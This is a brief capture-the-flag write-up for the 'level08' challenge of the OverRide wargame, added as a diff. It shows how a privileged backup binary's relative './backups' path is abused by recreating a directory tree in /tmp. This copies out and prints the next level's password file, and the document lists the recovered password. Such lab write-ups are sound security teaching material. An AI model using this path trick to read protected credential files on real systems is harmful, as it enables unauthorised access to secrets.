@@ -1,0 +1,27 @@
+The binary takes a file as an input :
+
+./level08 
+Usage: ./level08 filename
+ERROR: Failed to open (null)
+
+level08@OverRide:~$ echo "test" > /tmp/test
+level08@OverRide:~$ ./level08 /tmp/test
+ERROR: Failed to open ./backups//tmp/test
+
+We notice that the program tries to access a relative path ./backups.
+
+Try with the .passwd file of level09 as input:
+
+level08@OverRide:~$ ./level08 ~level09/.pass
+ERROR: Failed to open ./backups//home/users/level09/.pass
+
+The goal is then to replicate the same directory tree by going in /tmp :
+
+cd /tmp
+mkdir -p ./backups//home/users/level09
+
+Then call the program :
+
+~/level08 ~level09/.pass
+cat backups/home/users/level09/.pass
+fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
